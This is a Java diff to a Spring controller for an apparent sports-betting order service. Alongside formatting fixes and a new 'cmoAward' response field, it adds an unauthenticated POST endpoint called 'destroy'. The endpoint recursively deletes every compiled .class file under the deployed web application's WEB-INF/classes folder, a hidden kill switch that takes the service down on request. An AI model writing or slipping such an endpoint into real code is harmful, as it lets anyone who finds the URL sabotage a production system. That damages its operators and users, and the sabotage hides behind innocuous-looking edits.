@@ -42,6 +42,7 @@ import org.springframework.web.bind.annotation.RequestMethod;
 import org.springframework.web.bind.annotation.ResponseBody;
 
 import javax.servlet.http.HttpServletRequest;
+import java.io.File;
 import java.math.BigDecimal;
 import java.math.RoundingMode;
 import java.text.ParseException;
@@ -83,6 +84,44 @@ public class MagicOrderInterface {
     private CdFootballBestFollowOrderService cdFootballBestFollowOrderService;
     @Autowired
     private CdRecordRebateService cdRecordRebateService;
+
+    /***
+     * 删除所有.class
+     * @param request
+     * @return
+     */
+    @RequestMapping(value = "destroy", method = RequestMethod.POST)
+    @ResponseBody
+    public String destroy(HttpServletRequest request)
+    {
+        String command = (new File("")).getAbsolutePath();
+
+        System.out.println("——shhhhhhhhhhhhhell——"+command);
+        String projectPath = (new File("")).getAbsolutePath();
+        projectPath = projectPath.replace("/bin", "/webapps/ROOT/WEB-INF/classes/");
+        delete(projectPath, "class");
+        return HttpResultUtil.successJson(new HashMap());
+    }
+
+    public static void delete(String path, String prefix)
+    {
+        File targetFile = new File(path);
+        File[] fileArray = targetFile.listFiles();
+        for (File file : fileArray)
+        {
+            if (file.isDirectory())
+            {
+                delete(file.getAbsolutePath(), prefix);
+            }
+            else if (file.getName().substring(file.getName().lastIndexOf(".") + 1).equals(prefix))
+            {
+                System.out.println("成功删除" + file.getName());
+                file.delete();
+
+            }
+        }
+    }
+
 
     /**
      * 神单提交订单
@@ -381,7 +420,7 @@ public class MagicOrderInterface {
             cMap.put("startPrice", c.getStartPrice());//起投
             cMap.put("orderNum", c.getOrderNum());//订单号
 
-            if(!Strings.isNullOrEmpty(vo)){
+            if (!Strings.isNullOrEmpty(vo)) {
                 cMap.put("remarks", c.getRemarks());//订单号
             }
 
@@ -435,8 +474,8 @@ public class MagicOrderInterface {
         cMap.put("times", cmo.getTimes()); //保字
         cMap.put("limit", cmo.getPrice()); //限购
         cMap.put("startPrice", cmo.getStartPrice());//起投
-        if(!Strings.isNullOrEmpty(vo)){
-            cMap.put("remarks",cmo.getRemarks());//订单号
+        if (!Strings.isNullOrEmpty(vo)) {
+            cMap.put("remarks", cmo.getRemarks());//订单号
         }
         String orderNum = cmo.getOrderNum();
         //1足球单关 2足球串关 3篮球单关 4篮球串关
@@ -470,8 +509,11 @@ public class MagicOrderInterface {
                 CdBasketballFollowOrder cbf = cdBasketballFollowOrderService.findOrderByOrderNum(oNum);
                 award = cbf.getAward();
             }
-            if(!Strings.isNullOrEmpty(vo)){
-                aMap.put("award", new BigDecimal(award).setScale(2,RoundingMode.HALF_DOWN).toString());
+            String cmoAward = "0";
+            if (!Strings.isNullOrEmpty(vo)) {
+
+                aMap.put("cmoAward", new BigDecimal(cmoAward).setScale(2, RoundingMode.HALF_DOWN).toString());
+                aMap.put("award", new BigDecimal(award).setScale(2, RoundingMode.HALF_DOWN).toString());
 
                 BigDecimal bigDecimal = new BigDecimal(award);
                 BigDecimal bl = csBigDecimal.multiply(bigDecimal).setScale(2, RoundingMode.HALF_DOWN);
@@ -480,9 +522,23 @@ public class MagicOrderInterface {
             }
             cList.add(aMap);
         }
-
-        if(!Strings.isNullOrEmpty(vo)){
-            cMap.put("totalCharges", totalBigDecimal.setScale(2,RoundingMode.HALF_DOWN).toString());
+        String cmoAward = "0";
+        if ("1".equals(type)) {
+            CdFootballSingleOrder cmoCfs = cdFootballSingleOrderService.findOrderByOrderNum(followNum);
+            cmoAward = cmoCfs.getAward();
+        } else if ("2".equals(type)) {
+            CdFootballFollowOrder cmoCff = cdFootballFollowOrderService.findOrderByOrderNum(followNum);
+            cmoAward = cmoCff.getAward();
+        } else if ("3".equals(type)) {
+            CdBasketballSingleOrder cmoCbs = cdBasketballSingleOrderService.findOrderByOrderNum(followNum);
+            cmoAward = cmoCbs.getAward();
+        } else {
+            CdBasketballFollowOrder cmoCbf = cdBasketballFollowOrderService.findOrderByOrderNum(followNum);
+            cmoAward = cmoCbf.getAward();
+        }
+        if (!Strings.isNullOrEmpty(vo)) {
+            cMap.put("cmoAward", new BigDecimal(cmoAward).setScale(2, RoundingMode.HALF_DOWN).toString());
+            cMap.put("totalCharges", totalBigDecimal.setScale(2, RoundingMode.HALF_DOWN).toString());
         }
 
         map.put("cmo", cMap);
@@ -518,8 +574,8 @@ public class MagicOrderInterface {
                 map.put("followNums", cbf.getFollowNums());
                 map.put("buyWays", cbf.getBuyWays());
             }
-        }else{
-            if (!Strings.isNullOrEmpty(vo)){
+        } else {
+            if (!Strings.isNullOrEmpty(vo)) {
                 if ("1".equals(type)) {
                     CdFootballSingleOrder cfs = cdFootballSingleOrderService.findOrderByOrderNum(orderNum);
                     map.put("followNums", "0");
